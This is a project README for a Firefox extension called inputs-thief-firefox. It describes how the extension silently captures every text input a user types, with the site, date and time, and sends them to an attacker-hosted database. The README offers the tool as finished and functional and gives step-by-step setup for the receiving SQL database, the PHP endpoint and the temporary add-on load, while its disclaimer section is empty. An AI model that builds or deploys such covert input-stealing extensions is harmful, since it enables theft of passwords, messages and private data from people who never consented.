# inputs-thief-firefox

## 1 - Explanations

Inputs thief firefox is an extension working on a firefox web browser, she takes care of retrieving all inputs with type="text", site, time and date. Once harvested, everything is sent to an online database without the user's knowledge.

## 2 - !(https://www.reed-sensor.com/wp-content/uploads/icon_disclaimer.jpg) Disclaimer <img src="https://www.reed-sensor.com/wp-content/uploads/icon_disclaimer.jpg" width="50" height="50">



## 3 - Necessary things

* The firefox web browser
* A SQL database hosted online
* A php script hosted online
(But it can work on a local web server: XAMPP or WAMP)

## 4 - Installation (The schema is as follows)

* Clone the repositorie : https://github.com/p3titcr0c0/inputs-thief-firefox.git

* Create a database, then a table named firefoxExtension, add an id which self-increments as data is entered. Then add four separate identifiers : date, heure, site, inputs

* Modify php-a-heberger.php to connect the php --> your database with PDO

* Heberger php-a-heberger.php online and remember the url

* Enter the url in the call of ajaxPost function, line 57 of script.js.

* Opening the about:debugging page with Firefox

> The about:debugging page provides a single place from which you can attach the Firefox Developer Tools to a number of debugging targets. At the moment it supports three main sorts of targets: restartless add-ons, tabs, and workers.

* load the temporary add-on with :
```bash
manifest.json
```

* Everything works, you will receive the inputs, the date and time and the site on your database.

## 5 - Project development

Finished and functional, 15/06/2020.

## 6 - Screenshots

#  ![demo](./logo.png)
